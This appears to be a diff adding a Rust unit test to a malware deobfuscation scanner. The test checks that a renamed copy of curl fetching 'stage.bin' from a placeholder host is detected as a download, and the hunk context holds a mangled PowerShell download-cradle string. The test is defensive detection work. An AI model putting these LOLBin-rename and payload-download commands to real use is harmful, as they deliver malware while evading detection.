@@ -13966,6 +13966,32 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_curl_alias_schemeless_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik -o Autoit3.exe curl-copy-schemeless.example/stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-copy-schemeless.example/stage.bin"
+                        && dst.as_deref() == Some("Autoit3.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from copied curl alias schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
